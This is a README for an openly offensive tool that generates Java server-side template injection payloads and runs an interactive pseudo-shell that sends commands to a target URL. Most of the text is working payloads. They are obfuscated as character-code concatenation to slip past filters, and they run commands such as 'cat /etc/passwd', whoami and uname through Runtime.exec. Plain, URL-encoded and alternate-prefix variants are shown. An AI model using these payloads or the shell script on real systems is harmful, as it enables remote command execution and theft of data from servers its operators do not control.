SSTI Payload Generator
======================
This generator is for a specific type of Java SSTI, inspired by the following [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#java):

```${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}```

The string is converted into a decimal value and then concatenated together. This python script will automate that process within a interactive Cmd prompt.

USAGE (help)
=============
Use the flag `-h` or `--help` to show the help message.  
The `-u` or `--url-encode` flag is passed to url encode the payload  
The `-p` or `--prefix` flag is used to change the default prefix of the payload, the default is "$"  

Examples are found below;

SSTI Skeleton
=============

`ssti-skel.py` uses the `Cmd` library to create a looped command prompt. This directly takes input from the command line, encodes it appropriately, and sends it via `requests` to the target url (`-t`). 

If successful, the script will be a `pseudo-shell`, allowing for commands to be sent in real time. If at anytime a request fails, the script will quit.

This is a very specific usecase. But if it works, it works.

Example command:

```python3 ssti-skel.py -t 'https://example.com/path?param='```

Depending on the response, the `ssti=str(output).split('&#39;')[1].rstrip()` variable will probably have to be changed to suit the response. No clever logic was implemented for this :)

#### Example 1:

```
> python3 ssti-payload.py
Command ==> whoami
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105))).getInputStream())}

Command ==> id
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())}

Command ==> uname -a
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(117).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(97))).getInputStream())}
```

#### Example 2 (url encoded):
```
> python3 ssti-payload.py -u
Command ==> whoami
%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%28119%29.concat%28T%28java.lang.Character%29.toString%28104%29%29.concat%28T%28java.lang.Character%29.toString%28111%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28109%29%29.concat%28T%28java.lang.Character%29.toString%28105%29%29%29.getInputStream%28%29%29%7D

Command ==> id
%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%28105%29.concat%28T%28java.lang.Character%29.toString%28100%29%29%29.getInputStream%28%29%29%7D

Command ==> uname -a
%24%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%28117%29.concat%28T%28java.lang.Character%29.toString%28110%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28109%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2845%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29%29.getInputStream%28%29%29%7D
```
#### Example 3: (modified prefix) (+with url encoding)

```
> python3 ssti-payload.py -p '*'
Command ==> whoami
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105))).getInputStream())}

Command ==> id
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())}

> python3 ssti-payload.py -u -p '#'
Command ==> uname -a
%23%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28T%28java.lang.Character%29.toString%28117%29.concat%28T%28java.lang.Character%29.toString%28110%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29.concat%28T%28java.lang.Character%29.toString%28109%29%29.concat%28T%28java.lang.Character%29.toString%28101%29%29.concat%28T%28java.lang.Character%29.toString%2832%29%29.concat%28T%28java.lang.Character%29.toString%2845%29%29.concat%28T%28java.lang.Character%29.toString%2897%29%29%29.getInputStream%28%29%29%7D
```

